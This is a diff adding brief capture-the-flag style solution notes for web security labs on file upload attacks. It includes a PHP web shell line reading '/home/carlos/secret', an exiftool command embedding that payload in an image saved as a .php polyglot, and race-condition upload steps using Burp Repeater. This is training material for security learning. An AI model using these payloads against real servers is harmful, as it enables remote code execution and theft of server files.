@@ -24,3 +24,11 @@ Login -> Upload a php file `<?php echo file_get_contents('/home/carlos/secret');
 
 # Lab: Remote code execution via polyglot web shell upload
 
+First Download a jpg/png file from internet -> Then use: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" example-original.jpg -o polyglot1.php` -> Now after login, upload that newly generated polyglot1.php file -> Its uploaded -> Now go back to my-account -> Right click the image and view it in a new tab
+
+
+# Web shell upload via race condition
+
+Login -> upload a valid jpg file -> Go back to my-account -> Right click the image and view it in a new tab -> capture that request
+Then upload shell.php file and capture that request
+Send both request in Burp Repeater -> For Image view request change from /files/avatar/[YOUR-IMAGE.jpg] to /files/avatar/shell.php -> Then Create a Group and add those two request in the same group (first shell.php request and then image view request) -> Duplicate the modified Viewing image request 8-10 times -> Then send in parallel -> One of the response will give the answer
